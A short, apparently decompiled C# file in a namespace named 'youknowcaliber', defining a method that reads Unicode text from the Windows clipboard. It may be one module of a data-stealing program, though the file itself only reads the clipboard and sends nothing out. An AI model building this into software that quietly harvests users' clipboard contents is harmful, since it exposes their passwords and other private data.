﻿using System;
using System.Runtime.InteropServices;

namespace youknowcaliber
{
	internal class Buffer
	{
		public static string GetBuffer()
		{
			bool flag = WinAPI.IsClipboardFormatAvailable(13U) && WinAPI.OpenClipboard(IntPtr.Zero);
			string result;
			if (flag)
			{
				string text = string.Empty;
				IntPtr clipboardData = WinAPI.GetClipboardData(13U);
				bool flag2 = !clipboardData.Equals(IntPtr.Zero);
				if (flag2)
				{
					IntPtr intPtr = WinAPI.GlobalLock(clipboardData);
					bool flag3 = !intPtr.Equals(IntPtr.Zero);
					if (flag3)
					{
						try
						{
							text = Marshal.PtrToStringUni(intPtr);
							WinAPI.GlobalUnlock(intPtr);
						}
						catch (Exception value)
						{
							Console.WriteLine(value);
						}
					}
				}
				WinAPI.CloseClipboard();
				result = text;
			}
			else
			{
				result = null;
			}
			return result;
		}

		private const uint CF_UNICODETEXT = 13U;
	}
}
